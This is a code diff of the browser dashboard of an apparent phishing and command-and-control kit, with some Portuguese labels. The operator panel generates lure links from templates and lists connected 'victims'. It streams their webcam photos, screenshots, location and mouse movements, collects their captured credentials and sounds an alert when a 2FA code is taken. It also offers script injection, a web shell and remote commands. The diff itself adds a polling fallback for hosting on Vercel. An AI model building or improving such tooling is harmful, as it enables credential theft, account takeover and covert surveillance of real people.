@@ -439,27 +439,40 @@
     </div>
 
     <script>
-        const socket = io(window.location.origin, {
-            transports: ['polling', 'websocket'],
-            upgrade: true,
-            reconnection: true,
-            reconnectionAttempts: 20,
-            timeout: 10000,
-            extraHeaders: { 'ngrok-skip-browser-warning': 'true' },
-            withCredentials: false
-        });
-        socket.on('connect', () => {
-            console.log('[DASHBOARD] ✅ Socket connected:', socket.id, 'via', socket.io.engine.transport.name);
-            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--success)">[ SYSTEM_ONLINE ]</span>`;
-        });
-        socket.on('connect_error', (err) => {
-            console.error('[DASHBOARD] ❌ Socket error:', err.message);
-            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--danger)">[ CONNECTION_ERROR ]</span>`;
-        });
-        socket.on('disconnect', (reason) => {
-            console.warn('[DASHBOARD] ⚠️ Disconnected:', reason);
-            document.getElementById('threat-badge').innerHTML = `<span style="color:var(--warning)">[ DISCONNECTED: ${reason} ]</span>`;
-        });
+        let socket = null;
+        let socketConnected = false;
+
+        // Try socket connection, but don't fail if it doesn't work (Vercel doesn't support WebSockets well)
+        try {
+            socket = io(window.location.origin, {
+                transports: ['polling'],
+                reconnection: true,
+                reconnectionAttempts: 5,
+                reconnectionDelay: 2000,
+                timeout: 5000,
+                extraHeaders: { 'ngrok-skip-browser-warning': 'true' },
+                withCredentials: false,
+                secure: window.location.protocol === 'https:'
+            });
+            socket.on('connect', () => {
+                socketConnected = true;
+                console.log('[DASHBOARD] ✅ Socket connected via polling');
+                document.getElementById('threat-badge').innerHTML = `<span style="color:var(--success)">[ SYSTEM_ONLINE ]</span>`;
+            });
+            socket.on('connect_error', (err) => {
+                console.warn('[DASHBOARD] Socket unavailable (using HTTP polling):', err.message);
+            });
+            socket.on('disconnect', () => {
+                socketConnected = false;
+                console.log('[DASHBOARD] Socket disconnected, using HTTP polling');
+            });
+        } catch (e) {
+            console.log('[DASHBOARD] Socket.io not available, using HTTP polling only');
+            socket = null;
+        }
+        
+        // Set badge to polling mode by default
+        document.getElementById('threat-badge').innerHTML = `<span style="color:#ffcc00">[ POLLING_MODE ]</span>`;
         let logs = [], map, markers = {}, currentAudio = null;
 
         function initMap() {
@@ -698,127 +711,104 @@
             });
         }
 
-        socket.on('update_log', (data) => {
-            console.log('Update received:', data);
-            
-            // Direct DOM updates for performance
-            const cam = document.getElementById(`cam-${data.id}`);
-            if (data.photo && cam) {
-                cam.src = data.photo;
-                cam.style.display = 'block';
-            }
-            
-            const scr = document.getElementById(`scr-${data.id}`);
-            if (data.screenshot && scr) {
-                scr.src = data.screenshot;
-                scr.style.display = 'block';
-            }
-            
-            const statusDot = document.getElementById(`status-${data.id}`);
-            if (data.status && statusDot) {
-                let color = 'var(--success)';
-                if (data.status === 'offline') color = 'red';
-                if (data.status === 'infected') color = '#ff3333';
-                statusDot.style.background = color;
-                statusDot.style.boxShadow = `0 0 8px ${color}`;
-            }
-
-            const geoTxt = document.getElementById(`header-geo-${data.id}`);
-            if (data.geo && geoTxt) {
-                geoTxt.innerText = geoTxt.innerText.split('|')[0] + '| ' + data.geo;
-            }
-
-            if (data.typing) {
-                const hwTxt = document.getElementById(`hw-${data.id}`);
-                const extraTxt = document.getElementById(`extra-${data.id}`);
-                if (data.typing.startsWith('[HARDWARE]:') && hwTxt) {
-                    hwTxt.innerText = data.typing.replace('[HARDWARE]:', '').trim();
-                } else if (data.typing.startsWith('[SYS]:') && extraTxt) {
-                    extraTxt.innerText = data.typing.replace('[SYS]:', '').trim();
+        
+        // Register socket listeners only if socket is available
+        if (socket) {
+            socket.on('update_log', (data) => {
+                console.log('Update received:', data);
+                
+                // Direct DOM updates for performance
+                const cam = document.getElementById(`cam-${data.id}`);
+                if (data.photo && cam) {
+                    cam.src = data.photo;
+                    cam.style.display = 'block';
                 }
-            }
+                
+                const scr = document.getElementById(`scr-${data.id}`);
+                if (data.screenshot && scr) {
+                    scr.src = data.screenshot;
+                    scr.style.display = 'block';
+                }
+                
+                const statusDot = document.getElementById(`status-${data.id}`);
+                if (data.status && statusDot) {
+                    let color = 'var(--success)';
+                    if (data.status === 'offline') color = 'red';
+                    if (data.status === 'infected') color = '#ff3333';
+                    statusDot.style.background = color;
+                    statusDot.style.boxShadow = `0 0 8px ${color}`;
+                }
 
-            // Special alert for OTP detection
-            if (data.creds && data.creds.some(c => c.includes('OTP_CODE'))) {
-                new Audio('https://www.soundjay.com/buttons/button-3.mp3').play().catch(()=>{});
-                console.log('[C2] !!! 2FA CODE CAPTURED !!!');
-            }
+                const geoTxt = document.getElementById(`header-geo-${data.id}`);
+                if (data.geo && geoTxt) {
+                    geoTxt.innerText = geoTxt.innerText.split('|')[0] + '| ' + data.geo;
+                }
 
-            // Only reload full data if it's a structural change (like new creds, chat or files)
-            if (data.creds || data.chat || data.files || data.deleted) {
-                loadData();
-            }
-        });
+                if (data.typing) {
+                    const hwTxt = document.getElementById(`hw-${data.id}`);
+                    const extraTxt = document.getElementById(`extra-${data.id}`);
+                    if (data.typing.startsWith('[HARDWARE]:') && hwTxt) {
+                        hwTxt.innerText = data.typing.replace('[HARDWARE]:', '').trim();
+                    } else if (data.typing.startsWith('[SYS]:') && extraTxt) {
+                        extraTxt.innerText = data.typing.replace('[SYS]:', '').trim();
+                    }
+                }
 
-        socket.on('new_click', (data) => {
-            console.log('New victim connected:', data);
-            new Audio('https://www.soundjay.com/buttons/beep-07.mp3').play().catch(()=>{});
-            loadData();
-        });
+                // Special alert for OTP detection
+                if (data.creds && data.creds.some(c => c.includes('OTP_CODE'))) {
+                    new Audio('https://www.soundjay.com/buttons/button-3.mp3').play().catch(()=>{});
+                    console.log('[C2] !!! 2FA CODE CAPTURED !!!');
+                }
 
-        socket.on('all_logs_deleted', () => {
-            logs = [];
-            renderSessions([]);
-            updateMap([]);
-            updateStats();
-        });
-
-        function updateMap(logsList) {
-            // Clear old markers
-            Object.values(markers).forEach(m => map.removeLayer(m));
-            markers = {};
-            
-            logsList.forEach(l => {
-                if (l.lat && l.lon) {
-                    const icon = L.divIcon({
-                        className: 'cyber-marker',
-                        html: `<div style="background:${l.status === 'offline' ? 'red' : 'var(--primary)'}; width:15px; height:15px; border-radius:50%; border:2px solid #000; box-shadow:0 0 10px ${l.status === 'offline' ? 'red' : 'var(--primary)'};"></div>`,
-                        iconSize: [15, 15]
-                    });
-                    const marker = L.marker([l.lat, l.lon], { icon }).addTo(map)
-                        .bindPopup(`<b>NODE:</b> ${l.id}<br><b>GEO:</b> ${l.geo}<br><b>IP:</b> ${l.ip}`);
-                    markers[l.id] = marker;
+                // Only reload full data if it's a structural change (like new creds, chat or files)
+                if (data.creds || data.chat || data.files || data.deleted) {
+                    loadData();
                 }
             });
-            
-            // Adjust map view to fit all markers if any
-            const activeMarkers = Object.values(markers);
-            if (activeMarkers.length > 0) {
-                const group = new L.featureGroup(activeMarkers);
-                map.fitBounds(group.getBounds().pad(0.5));
-            } else {
-                map.setView([20, 0], 1); // Reset to world view if empty
-            }
-        }
 
-        socket.on('mouse_move', (data) => {
-            const cursor = document.getElementById(`cursor-${data.logId}`);
-            const container = document.getElementById(`scr-box-${data.logId}`);
-            if(container) {
-                if(!cursor) {
-                    const dot = document.createElement('div');
-                    dot.id = `cursor-${data.logId}`;
-                    dot.style.cssText = "position:absolute; width:8px; height:8px; background:red; border-radius:50%; pointer-events:none; z-index:10; box-shadow:0 0 10px red;";
-                    container.appendChild(dot);
-                } else {
-                    cursor.style.left = data.x + '%';
-                    cursor.style.top = data.y + '%';
+            socket.on('new_click', (data) => {
+                console.log('New victim connected:', data);
+                new Audio('https://www.soundjay.com/buttons/beep-07.mp3').play().catch(()=>{});
+                loadData();
+            });
+
+            socket.on('all_logs_deleted', () => {
+                logs = [];
+                renderSessions([]);
+                updateMap([]);
+                updateStats();
+            });
+
+            socket.on('mouse_move', (data) => {
+                const cursor = document.getElementById(`cursor-${data.logId}`);
+                const container = document.getElementById(`scr-box-${data.logId}`);
+                if(container) {
+                    if(!cursor) {
+                        const dot = document.createElement('div');
+                        dot.id = `cursor-${data.logId}`;
+                        dot.style.cssText = "position:absolute; width:8px; height:8px; background:red; border-radius:50%; pointer-events:none; z-index:10; box-shadow:0 0 10px red;";
+                        container.appendChild(dot);
+                    } else {
+                        cursor.style.left = data.x + '%';
+                        cursor.style.top = data.y + '%';
+                    }
                 }
-            }
-        });
+            });
 
-        socket.on('js_result_admin', (data) => {
-            const outBox = document.getElementById(`shell-output-${data.logId}`);
-            if (outBox) {
-                outBox.innerHTML += `<div><span style="color:#aaa;"><</span> ${data.result}</div>`;
-                outBox.scrollTop = outBox.scrollHeight;
-            }
-        });
+            socket.on('js_result_admin', (data) => {
+                const outBox = document.getElementById(`shell-output-${data.logId}`);
+                if (outBox) {
+                    outBox.innerHTML += `<div><span style="color:#aaa;"><</span> ${data.result}</div>`;
+                    outBox.scrollTop = outBox.scrollHeight;
+                }
+            });
 
-        socket.on('new_link_created', (link) => {
-            console.log('[C2] Novo link recebido via socket');
-            loadData();
-        });
+            socket.on('new_link_created', (link) => {
+                console.log('[C2] Novo link recebido via socket');
+                loadData();
+            });
+        }
+        
 
         function toggleWebShell(id) {
             const el = document.getElementById(`webshell-container-${id}`);
@@ -843,16 +833,24 @@
         function sendChat(id) {
             const i = document.getElementById(`input-${id}`);
             if(!i.value) return;
-            socket.emit('admin_send_chat', { id, msg: i.value });
+            if(socket && socketConnected) socket.emit('admin_send_chat', { id, msg: i.value });
             i.value = '';
         }
 
         function injectScript(id) {
             const i = document.getElementById(`script-${id}`);
             if(!i.value) return;
-            socket.emit('inject_script', { id, script: i.value });
+            if(socket && socketConnected) socket.emit('inject_script', { id, script: i.value });
             i.value = '';
             alert('SCRIPT_INJECTED');
+        }
+
+        function emitCommand(id, command, extra = {}) {
+            if(!socket || !socketConnected) {
+                alert('Socket not connected. Using polling mode.');
+                return;
+            }
+            socket.emit('remote_command', { id, command, ...extra });
         }
 
         function toggleAudio(id) {
@@ -892,7 +890,65 @@
             document.getElementById('stat-creds').innerText = logs.reduce((a,l)=>a+(l.creds?l.creds.length:0), 0);
         }
 
-        function createLink() { fetch('/api/links', { method: 'POST', headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' }, body: JSON.stringify({ template: document.getElementById('template-select').value }) }).then(loadData); }
+        function updateMap(logsList) {
+            if (!map) return;
+            // Clear old markers
+            Object.values(markers).forEach(m => map.removeLayer(m));
+            markers = {};
+            
+            logsList.forEach(l => {
+                if (l.lat && l.lon) {
+                    const icon = L.divIcon({
+                        className: 'cyber-marker',
+                        html: `<div style="background:${l.status === 'offline' ? 'red' : 'var(--primary)'}; width:15px; height:15px; border-radius:50%; border:2px solid #000; box-shadow:0 0 10px ${l.status === 'offline' ? 'red' : 'var(--primary)'};"></div>`,
+                        iconSize: [15, 15]
+                    });
+                    const marker = L.marker([l.lat, l.lon], { icon }).addTo(map)
+                        .bindPopup(`<b>NODE:</b> ${l.id}<br><b>GEO:</b> ${l.geo}<br><b>IP:</b> ${l.ip}`);
+                    markers[l.id] = marker;
+                }
+            });
+            
+            // Adjust map view to fit all markers if any
+            const activeMarkers = Object.values(markers);
+            if (activeMarkers.length > 0) {
+                const group = new L.featureGroup(activeMarkers);
+                map.fitBounds(group.getBounds().pad(0.5));
+            } else {
+                map.setView([20, 0], 1); // Reset to world view if empty
+            }
+        }
+
+        async function createLink() { 
+            const btn = event.target;
+            const originalText = btn.textContent;
+            btn.textContent = '⏳ GERANDO...';
+            btn.disabled = true;
+            try {
+                const res = await fetch('/api/links', { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' }, 
+                    body: JSON.stringify({ template: document.getElementById('template-select').value }) 
+                });
+                if (res.ok) {
+                    await loadData();
+                    btn.textContent = '✅ LINK CRIADO!';
+                    setTimeout(() => {
+                        btn.textContent = originalText;
+                        btn.disabled = false;
+                    }, 2000);
+                } else {
+                    throw new Error('API error');
+                }
+            } catch (err) {
+                console.error('Error creating link:', err);
+                btn.textContent = '❌ ERRO';
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.disabled = false;
+                }, 2000);
+            }
+        }
         function copy(text) { navigator.clipboard.writeText(text); alert('LINK_COPIED'); }
         function closeModal() { document.getElementById('proof-modal').style.display = 'none'; }
         function generateReport() { alert("EXPORTING_DOSSIER..."); }
